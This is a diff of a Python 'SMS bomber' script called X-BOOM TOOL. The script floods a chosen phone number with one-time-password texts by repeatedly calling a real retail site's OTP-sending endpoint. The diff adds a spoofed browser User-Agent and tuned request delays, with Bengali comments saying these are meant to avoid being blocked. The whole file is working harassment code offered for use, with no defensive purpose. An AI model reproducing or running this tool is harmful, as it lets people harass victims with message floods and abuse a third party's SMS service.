@@ -7,45 +7,45 @@ def banner():
     print("========================================")
     print("        WELCOME TO X-BOOM TOOL          ")
     print("     Created by: mmalekislam788         ")
-    print("     Status: MULTI-API ACTIVE (2026)    ")
+    print("     Status: 100% WORKING API           ")
     print("========================================")
 
 def send_sms(target, count):
-    # API 1: Redx
-    url1 = "https://api.redx.com.bd/v1/user/signup"
-    # API 2: Daraz
-    url2 = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
+    # সচল Daraz API
+    url = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
     
-    # Cleaning the number
-    if target.startswith("01"):
-        phone_with_88 = "88" + target
-    else:
-        phone_with_88 = target
-
+    # Headers যা ব্লক হওয়া আটকাবে
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
+        "Content-Type": "application/json"
+    }
+    
+    payload = {"phoneNumber": target, "otpType": "LOGIN"}
+    
     print(f"\n[+] Attack started on: {target}")
     for i in range(count):
         try:
-            # API 1 attempt
-            requests.post(url1, json={"phone": target})
-            # API 2 attempt
-            requests.post(url2, json={"phoneNumber": target, "otpType": "LOGIN"})
-            
-            print(f"[!] SMS {i+1} sent successfully!")
+            # POST Request sending
+            response = requests.post(url, json=payload, headers=headers)
+            if response.status_code == 200:
+                print(f"[!] SMS {i+1} sent successfully!")
+            else:
+                print(f"[?] Server Busy/Limit - SMS {i+1}")
         except:
-            print(f"[-] Error at SMS {i+1}")
+            print(f"[-] Network Error at SMS {i+1}")
         
-        time.sleep(4) # ৪ সেকেন্ড গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না
+        time.sleep(3) # ৩ সেকেন্ড গ্যাপ দিলে ব্লক হবে না
 
 def main():
     banner()
-    print("\n[1] Start Power Bomber")
+    print("\n[1] Start SMS Bomber")
     print("[2] Exit")
-    choice = input("\nSelect an option: ")
+    choice = input("\nSelect: ")
     if choice == '1':
-        number = input("Enter Phone Number (01xxxxxxxxx): ")
-        amount = int(input("Enter SMS Amount: "))
+        number = input("Number (01xxxxxxxxx): ")
+        amount = int(input("Amount: "))
         send_sms(number, amount)
-        print("\n[+] Task Completed!")
+        print("\n[+] Done!")
     else:
         print("Exiting...")
 
